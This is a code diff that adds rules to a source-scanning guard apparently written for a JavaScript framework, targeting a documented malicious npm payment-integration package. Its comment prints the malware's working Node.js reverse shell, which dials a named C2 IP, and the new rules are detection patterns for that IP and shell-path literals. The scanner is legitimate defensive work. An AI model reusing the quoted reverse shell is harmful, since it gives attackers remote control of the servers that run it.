@@ -136,6 +136,56 @@
  * no channel left to drop in an `addBotId()`-shape SSH-key-injection
  * backdoor.
  *
+ * ---
+ *
+ * **Advcash / `@naderabdi/merchant-advcash` reverse-shell extension
+ * (Socket 2025-04-14,
+ * https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell):**
+ *
+ * The malicious `@naderabdi/merchant-advcash` package posed as a
+ * legitimate Advcash payment-gateway integration (with believable
+ * SHA-256 hashing, request validation, currency checks, and
+ * `url_success(req, res)` callback wiring) but hid a self-executing
+ * reverse shell at the top of the success callback:
+ *
+ *   ```js
+ *   (function(){
+ *     var net = require("net"),
+ *         cp  = require("child_process"),
+ *         sh  = cp.spawn("/bin/sh", []);
+ *     var client = new net.Socket();
+ *     client.connect(8443, "65.109.184.223", function(){
+ *       client.pipe(sh.stdin);
+ *       sh.stdout.pipe(client);
+ *       sh.stderr.pipe(client);
+ *     });
+ *     return /a/; // suppress crash
+ *   })();
+ *   ```
+ *
+ * The payload only detonates AT RUNTIME during a successful payment
+ * (not at install or import), which lets it evade install-time
+ * scanners and `ignore-scripts=true` cooldown gates. The
+ * upstream `verify-no-remote-exec` ban on `child_process` already
+ * stops the `cp.spawn("/bin/sh", ...)` half of this in `src/**`, and
+ * `verify-no-registry-exfiltration`'s raw-IPv4-URL gate catches an
+ * `http://65.109.184.223:8443/...` C2 URL — but the Advcash variant
+ * dials TCP directly via `client.connect(8443, "65.109.184.223")`,
+ * so the IOC IP appears as a **bare literal** rather than inside an
+ * `http(s)://` URL. This gate adds two belt-and-braces literals:
+ *
+ *   1. The bare IOC IP `65.109.184.223`, mirroring the
+ *      `85.239.62.36` (RATatouille) bare-literal IOC.
+ *   2. The reverse-shell shell prefixes `/bin/sh`, `/bin/bash`,
+ *      `/bin/zsh`, and the Windows `cmd.exe` shell — none of which
+ *      have any legitimate use as a string literal inside Daloy's
+ *      TypeScript/JavaScript runtime source. Even if a future
+ *      `child_process` ban bypass landed (e.g. an
+ *      `eval`-from-base64 trick that reconstructs `"child_process"`
+ *      at runtime), a `spawn("/bin/sh", ...)`-shape reverse shell
+ *      would still need the shell name as a literal somewhere — and
+ *      this gate refuses that.
+ *
  * @since 0.50.0
  */
 
@@ -471,6 +521,42 @@ const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
       "fingerprint victims (Telegram-bot SSH-backdoor class, " +
       "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
       "framework reads the client IP from request headers, never a public lookup",
+    keepStrings: true,
+  },
+  // ---- Advcash `@naderabdi/merchant-advcash` reverse-shell campaign
+  //      (Socket 2025-04-14,
+  //      https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell) ----
+  //
+  // The malicious package dialed a reverse shell via raw TCP
+  // (`client.connect(8443, "65.109.184.223")`) — the IOC IP is a bare
+  // string literal, NOT inside an `http(s)://` URL, so the raw-IPv4-URL
+  // gate above does not catch it.
+  {
+    re: /\b65\.109\.184\.223\b/,
+    reason:
+      "`65.109.184.223` is the documented reverse-shell C2 host for the " +
+      "`@naderabdi/merchant-advcash` payment-callback reverse-shell campaign " +
+      "(https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell); " +
+      "any reference in `src/**` is a hard IOC",
+    keepStrings: true,
+  },
+  {
+    // Reverse-shell shell prefixes. The Advcash payload calls
+    // `cp.spawn("/bin/sh", [])`; other shapes in the wild use
+    // `/bin/bash`, `/bin/zsh`, or `cmd.exe`. A backend HTTP framework
+    // has no legitimate reason to ever materialize one of these as
+    // a string literal in its runtime source — even with the
+    // `child_process` ban from `verify-no-remote-exec`, this is
+    // belt-and-braces against an aliased-spawn / decoded-string
+    // bypass that reconstructs the module name at runtime.
+    re: /["'`](?:\/bin\/(?:sh|bash|zsh|dash|ksh|ash)|cmd\.exe)\b/,
+    reason:
+      "shell-name literal (`/bin/sh`, `/bin/bash`, `/bin/zsh`, `/bin/dash`, `/bin/ksh`, " +
+      "`/bin/ash`, `cmd.exe`) in source is the reverse-shell shell prefix used by the " +
+      "`@naderabdi/merchant-advcash` payment-callback reverse-shell campaign " +
+      "(`cp.spawn(\"/bin/sh\", [])`, " +
+      "https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell); " +
+      "Daloy core never shells out — remove this literal",
     keepStrings: true,
   },
 ];
